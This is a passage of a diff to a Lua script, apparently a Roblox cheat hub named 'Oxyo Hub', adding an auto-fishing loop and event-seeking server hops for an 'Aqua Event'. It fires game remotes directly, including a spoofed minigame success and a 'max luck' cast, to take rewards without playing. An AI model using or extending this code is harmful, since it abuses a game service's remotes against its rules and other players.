+            if (rn:find("aqua") or name:find("aqua")) and trem >= 0 then
+                local isActive = false
+                pcall(function()
+                    local json2 = workspace:GetAttribute("ActiveEvents")
+                    if json2 and json2 ~= "" then
+                        local d2 = game:GetService("HttpService"):JSONDecode(json2)
+                        for k2 in pairs(d2) do
+                            if tostring(k2):lower():find("aqua") then isActive = true end
+                        end
+                    end
+                end)
+                if not isActive then return math.max(trem, 5) end
+            end
+        end
+        return nil
+    end)
+    if ok2 and result2 then return result2 end
+
+    local ok, result = pcall(function()
+        local json = workspace:GetAttribute("QueuedEvents")
+        if not json or json == "" then return nil end
+        local d = game:GetService("HttpService"):JSONDecode(json)
+        for key, entry in pairs(d) do
+            if tostring(key):lower():find("aqua", 1, true) then
+                local t = tonumber(type(entry) == "table" and entry.EventTime) or 0
+                if t > 0 then return math.min(t, 1200) end
+            end
+        end
+        return nil
+    end)
+    return ok and result or nil
+end
+
+local function _getWaterPos()
+    local gf = workspace:FindFirstChild("GameFolder")
+    local ae = gf and gf:FindFirstChild("AquaEvent")
+    if ae then
+        local fm  = ae:FindFirstChild("FishingModel")
+        local wp  = fm and fm:FindFirstChild("WaterPart")
+        local att = wp and wp:FindFirstChild("PromptAttachment")
+        if att then return att.WorldPosition end
+        if wp  then return wp.Position end
+        local bp = ae:FindFirstChildWhichIsA("BasePart")
+        if bp  then return bp.Position end
+    end
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if root then
+        return root.Position + root.CFrame.LookVector * 12 - Vector3.new(0, 3, 0)
+    end
+    return Vector3.new(0, 0, 0)
+end
+
+local function _equipFishingRod()
+    local char    = player.Character
+    local backpack = player:FindFirstChild("Backpack")
+    if not char or not backpack then return false end
+    if char:FindFirstChild("Fishing Rod") then return true end
+    for _, v in pairs(backpack:GetChildren()) do
+        if v:IsA("Tool") and v.Name == "Fishing Rod" then
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hum then pcall(function() hum:EquipTool(v) end) end
+            task.wait(0.2)
+            return char:FindFirstChild("Fishing Rod") ~= nil
+        end
+    end
+    return false
+end
+
+local function _updateAquaStats()
+    if not _aquaStatsPara then return end
+    if not _aquaRunning then return end
+    pcall(function()
+        local elapsed = tick() - _aquaStats.startTick
+        local mins    = math.floor(elapsed / 60)
+        local secs    = math.floor(elapsed % 60)
+        local rate    = _aquaStats.catches > 0
+            and string.format("%.1f/min", _aquaStats.catches / math.max(elapsed / 60, 0.01))
+            or  "—"
+        _aquaStatsPara:Set({
+            Title   = "📊 Session Stats",
+            Content = string.format(
+                "🎣 Casts: %d   ✅ Catches: %d   ❌ Fails: %d\n⚡ Rate: %s   ⏱ %02d:%02d",
+                _aquaStats.casts, _aquaStats.catches, _aquaStats.fails, rate, mins, secs
+            ),
+        })
+    end)
+end
+
+local function _stopAquaLoopImpl()
+    _aquaRunning = false
+    if _aquaThread       then pcall(task.cancel, _aquaThread)       _aquaThread       = nil end
+    if _aquaMinigameConn then pcall(function() _aquaMinigameConn:Disconnect() end) _aquaMinigameConn = nil end
+    if _aquaCastConn     then pcall(function() _aquaCastConn:Disconnect() end)     _aquaCastConn     = nil end
+    getgenv()._OxyoStopAquaLoop = nil
+end
+_stopAquaLoop = _stopAquaLoopImpl
+getgenv()._OxyoStopAquaLoop = _stopAquaLoop
+
+_startAquaLoop = function()
+    if not _getAquaRemotes() then
+        Rayfield:Notify({
+            Title   = "🎣 Auto Fish",
+            Content = "AquaEvent remotes not found.\nMake sure the Aqua Event is active!",
+            Duration = 5, Image = 4483362458,
+        })
+        _aquaRunning = false
+        pcall(function()
+            local f = Rayfield.Flags and Rayfield.Flags["AutoFish"]
+            if f then f:Set(false) end
+        end)
+        return
+    end
+
+    _aquaStats = { casts = 0, catches = 0, fails = 0, startTick = tick() }
+    local _miniPending = false
+
+    if _aquaMinigameConn then _aquaMinigameConn:Disconnect() end
+    _aquaMinigameConn = _aquaRemotes.startMini.OnClientEvent:Connect(function()
+        if not _aquaRunning then return end
+        _miniPending = true
+        task.spawn(function()
+            task.wait(0.05)
+            if not _aquaRunning then _miniPending = false return end
+            if _aquaRemotes.miniResult and _aquaRemotes.miniResult.Parent then
+                pcall(function() _aquaRemotes.miniResult:FireServer(true) end)
+            end
+            _aquaStats.catches = _aquaStats.catches + 1
+            _miniPending = false
+            _updateAquaStats()
+        end)
+    end)
+
+    _aquaThread = task.spawn(function()
+        Rayfield:Notify({
+            Title   = "🎣 Auto Fish ON",
+            Content = "Casting every ~3s with max luck!\nMake sure Fishing Rod is in backpack.",
+            Duration = 4, Image = 4483362458,
+        })
+
+        while _aquaRunning do
+            if not _isAquaActive() then
+                Rayfield:Notify({
+                    Title   = "🎣 Auto Fish",
+                    Content = "Aqua Event not active — waiting...",
+                    Duration = 4, Image = 4483362458,
+                })
+                local waited = 0
+                while not _isAquaActive() and _aquaRunning do
+                    task.wait(3)
+                    waited = waited + 3
+                    if waited >= 120 then
+                        Rayfield:Notify({
+                            Title   = "🎣 Auto Fish",
+                            Content = "No Aqua Event after 2 min — stopped.",
+                            Duration = 5, Image = 4483362458,
+                        })
+                        _aquaRunning = false
+                        pcall(function()
+                            local f = Rayfield.Flags and Rayfield.Flags["AutoFish"]
+                            if f then f:Set(false) end
+                        end)
+                        return
+                    end
+                end
+                if not _aquaRunning then break end
+                Rayfield:Notify({
+                    Title   = "🎣 Auto Fish",
+                    Content = "Aqua Event detected — casting!",
+                    Duration = 3, Image = 4483362458,
+                })
+            end
+
+            if _miniPending then task.wait(0.2) continue end
+
+            pcall(_equipFishingRod)
+
+            local char = player.Character
+            if not char or not char:FindFirstChild("Fishing Rod") then
+                Rayfield:Notify({
+                    Title   = "🎣 Auto Fish",
+                    Content = "Fishing Rod not found in backpack!\nBuy one from the shop first.",
+                    Duration = 6, Image = 4483362458,
+                })
+                task.wait(5)
+                continue
+            end
+
+            local waterPos = _getWaterPos()
+            local ok = false
+            if _aquaRemotes.cast and _aquaRemotes.cast.Parent then
+                ok = pcall(function()
+                    _aquaRemotes.cast:FireServer(waterPos, 3)
+                end)
+            end
+
+            if ok then
+                _aquaStats.casts = _aquaStats.casts + 1
+                _updateAquaStats()
+            end
+
+            local waitTime = 0
+            while waitTime < 3.5 and _aquaRunning do
+                task.wait(0.1)
+                waitTime = waitTime + 0.1
+                if _miniPending then break end
+            end
+
+            if _aquaRunning and not _miniPending then
+                if _aquaRemotes.reel and _aquaRemotes.reel.Parent then
+                    pcall(function() _aquaRemotes.reel:FireServer() end)
+                end
+                _aquaStats.fails = _aquaStats.fails + 1
+                _updateAquaStats()
+                task.wait(2.2)
+            else
+                task.wait(2.2)
+            end
+        end
+    end)
+end
+
+AquaTab:CreateSection("🎣 Auto Fish")
+
+AquaTab:CreateParagraph({
+    Title   = "How it works",
+    Content = "Automatically casts your Fishing Rod with max luck (x3),\n"
+           .. "waits for a bite, then instantly completes the minigame.\n"
+           .. "Requires: Aqua Event active + Fishing Rod in backpack.",
+})
+
+_aquaStatsPara = AquaTab:CreateParagraph({
+    Title   = "📊 Session Stats",
+    Content = "Idle — start Auto Fish to begin tracking.",
+})
+
+AquaTab:CreateToggle({
+    Name         = "🎣 Auto Fish",
+    CurrentValue = false,
+    Flag         = "AutoFish",
+    Callback     = function(val)
+        _aquaRunning = val
+        if val then
+            hideLava()
+            _startAquaLoop()
+        else
+            _stopAquaLoop()
+            _updateAquaStats()
+            pcall(function()
+                if _aquaStatsPara then
+                    _aquaStatsPara:Set({
+                        Title   = "📊 Session Ended",
+                        Content = string.format(
+                            "🎣 Casts: %d   ✅ Catches: %d   ❌ Fails: %d",
+                            _aquaStats.casts, _aquaStats.catches, _aquaStats.fails
+                        ),
+                    })
+                end
+            end)
+            Rayfield:Notify({
+                Title   = "🎣 Auto Fish OFF",
+                Content = string.format("Session: %d casts, %d catches", _aquaStats.casts, _aquaStats.catches),
+                Duration = 4, Image = 4483362458,
+            })
+        end
+    end,
+})
+
+AquaTab:CreateSection("🔧 Manual Controls")
+
+AquaTab:CreateButton({
+    Name     = "🔍 Check Aqua Event Status",
+    Callback = function()
+        local active = _isAquaActive()
+        local queuedSecs = _getAquaQueuedTime()
+        local hasRod = false
+        pcall(function()
+            local bp = player:FindFirstChild("Backpack")
+            local ch = player.Character
+            hasRod = (bp and bp:FindFirstChild("Fishing Rod") ~= nil)
+                  or (ch and ch:FindFirstChild("Fishing Rod") ~= nil)
+        end)
+        local remotesOk = _getAquaRemotes()
+        local statusLine
+        if active then
+            statusLine = "✅ ACTIVE now!"
+        elseif queuedSecs and queuedSecs > 0 then
+            statusLine = string.format("⏳ Queued — starts in %dm %ds", math.floor(queuedSecs/60), queuedSecs%60)
+        else
+            statusLine = "❌ Not active / not queued"
+        end
+        Rayfield:Notify({
+            Title   = active and "🌊 Aqua Event: ACTIVE" or (queuedSecs and "⏳ Aqua Event: Queued" or "⚠️ Aqua Event: Inactive"),
+            Content = string.format(
+                "Event: %s\nFishing Rod: %s\nRemotes: %s",
+                statusLine,
+                hasRod and "✅ Found" or "❌ Not in backpack",
+                remotesOk and "✅ Found" or "❌ Missing"
+            ),
+            Duration = 8, Image = 4483362458,
+        })
+    end,
+})
+
+end)()
+
+if getgenv().OxyoAutoHopAqua == true and not getgenv().OxyoHopAquaStopped then
+    S.autoHopAquaEnabled = true
+    hideLava()
+    showStopHopGui()
+    S.autoHopAquaThread = task.spawn(function()
+        task.wait(4)
+        while getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped do
+            if _isAquaActive() then
+                if not _getAquaRemotes() then
+                    task.wait(3)
+                    if getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped then
+                        task.spawn(ServerHop)
+                    end
+                    return
+                end
+                _aquaRunning = true
+                _startAquaLoop()
+                local waited = 0
+                while _aquaRunning and getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped do
+                    task.wait(5) waited = waited + 5
+                    if not _isAquaActive() and waited > 10 then _stopAquaLoop() break end
+                end
+                if not getgenv().OxyoAutoHopAqua or getgenv().OxyoHopAquaStopped then return end
+                task.wait(2)
+                if getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped then task.spawn(ServerHop) end
+                return
+            else
+
+                local _aquaGraceEnd2 = tick() + 8
+                while not _isAquaActive() and tick() < _aquaGraceEnd2
+                    and getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped do
+                    task.wait(1)
+                end
+                if _isAquaActive() then continue end
+
+                local queuedSecs = _getAquaQueuedTime()
+                if queuedSecs and queuedSecs > 0 and queuedSecs <= 1200 then
+                    local mins = math.floor(queuedSecs / 60)
+                    local secs = queuedSecs % 60
+                    Rayfield:Notify({
+                        Title   = "🌊 Aqua Event Incoming!",
+                        Content = string.format("Queued in %dm %ds — waiting on this server!", mins, secs),
+                        Duration = 6, Image = 4483362458,
+                    })
+                    local waited2 = 0
+                    while waited2 < queuedSecs + 10
+                        and getgenv().OxyoAutoHopAqua
+                        and not getgenv().OxyoHopAquaStopped
+                        and not _isAquaActive() do
+                        task.wait(2)
+                        waited2 = waited2 + 2
+                    end
+                    continue
+                end
+                task.wait(math.random(5,10))
+                if getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped then task.spawn(ServerHop) end
+                return
+            end
+        end
+    end)
+end
+
+task.spawn(function()
+    while true do
+        task.wait(1800)
+        pcall(function()
+            getgenv().OxyoDeadServers    = {}
+            getgenv().OxyoVisitedServers = {}
+        end)
+    end
+end)
+print("Oxyo Hub loaded.")
